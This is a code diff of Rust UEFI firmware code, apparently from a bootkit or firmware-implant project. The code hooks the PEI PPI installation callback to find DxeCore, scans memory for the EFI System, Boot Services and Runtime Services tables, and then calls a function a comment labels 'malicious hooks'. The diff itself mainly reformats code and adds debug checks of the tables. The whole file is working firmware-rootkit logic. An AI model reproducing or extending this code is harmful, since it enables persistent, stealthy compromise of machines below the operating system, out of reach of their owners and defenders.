@@ -31,12 +31,13 @@ pub unsafe fn hook_dxe_core(svc: &mut PeiServices) -> Result<(), EfiStatus> {
 
 /// EFI_INSTALL_PPI hook is triggered as a callback after our PEIM exits.
 extern "efiapi" fn install_ppi_hook(
-    svc: PeiServicesPtr, mut ppi_list: *const PpiDescriptor) -> EfiStatus {
+            svc: PeiServicesPtr, mut ppi_list: *const PpiDescriptor) -> EfiStatus {
     // DxeCore loader installs EFI_PEI_END_OF_PEI_PPI to signal end of PEI.
     const PPI_DESCRIPTOR_TERMINATE_LIST: usize = 0x80000000;
     const PEI_END_OF_PEI_PPI: Guid = guid!("605ea650-c65c-42e1-ba8091a52ab618c6");
 
-    // Iterate until we can find DxeCore or proxy to original function.
+    // Iterate the PPIs until we find DxeCore, where we install a hook,
+    // while passing execution to the original function for each PPI.
     unsafe { loop {
         let descriptor = &*ppi_list;
         if *descriptor.guid == PEI_END_OF_PEI_PPI {
@@ -60,11 +61,10 @@ extern "efiapi" fn install_ppi_hook(
     }}
 }
 
-pub(crate) unsafe fn find_services(lo: *const u64, hi: *const u64)
-    -> EfiResult<(
-        &'static mut SystemTable,
-        &'static mut BootServices,
-        &'static mut RuntimeServices)> {
+unsafe fn find_services(lo: *const u64, hi: *const u64)
+        -> EfiResult<(&'static mut SystemTable,
+                      &'static mut BootServices,
+                      &'static mut RuntimeServices)> {
     // The service tables include a signature which we can search for.
     // The signatures will be aligned because of struct allocation.
     const EFI_BOOT_SERVICES_SIGNATURE: u64 = 0x56524553544f4f42;
@@ -106,14 +106,23 @@ unsafe fn find_and_hook_services(svc: PeiServicesPtr) -> EfiResult<()> {
     let lo = hob.alloc_header.memory_base_address as *const u64;
     let hi = lo.byte_add(hob.alloc_header.memory_length as usize);
 
+    // Attempt to locate the tables within the HOB range.
     let (st, bs, rt) = find_services(lo, hi)?;
 
+    debug!("verifying table contents are as expected");
+    // gRT is initially filled out with placeholder functions.
+    debug!("gRT->GetTime       = {:p}", rt.get_time);
+    debug!("gRT->SetTime       = {:p}", rt.set_time);
+    debug!("gRT->SetWakeupTime = {:p}", rt.set_wakeup_time);
+    assert!(rt.get_time == rt.set_wakeup_time && rt.get_time != rt.set_time);
+    info!("table contents have been successfully validated");
+
     // Install the malicious hooks into the tables.
-    hooks::install_dxe_hooks(st, bs, rt, lo, hi)
+    hooks::install_dxe_hooks(st, bs, rt)
 }
 
-unsafe fn find_dxe_core_hob(
-    svc: &&mut PeiServices) -> EfiResult<*const MemoryAllocationModule> {
+unsafe fn find_dxe_core_hob(svc: &&mut PeiServices)
+        -> EfiResult<*const MemoryAllocationModule> {
     // Retrieve the final HOB list for all PEIMs.
     let mut hob_list: *const HobGenericHeader = core::ptr::null();
     let status = (svc.get_hob_list)(svc, &mut hob_list);
@@ -152,8 +161,8 @@ unsafe fn find_dxe_core_hob(
     Err(EfiStatus::NotFound)
 }
 
-unsafe fn locate_table<T>(mut addr: *const u64, hi: *const u64, sig: u64
-                          ) -> EfiResult<&'static mut T> {
+pub unsafe fn locate_table<T>(mut addr: *const u64, hi: *const u64, sig: u64)
+        -> EfiResult<&'static mut T> {
     while addr < hi {
         if *addr == sig {
             return Ok(&mut *addr.cast::<T>().cast_mut());
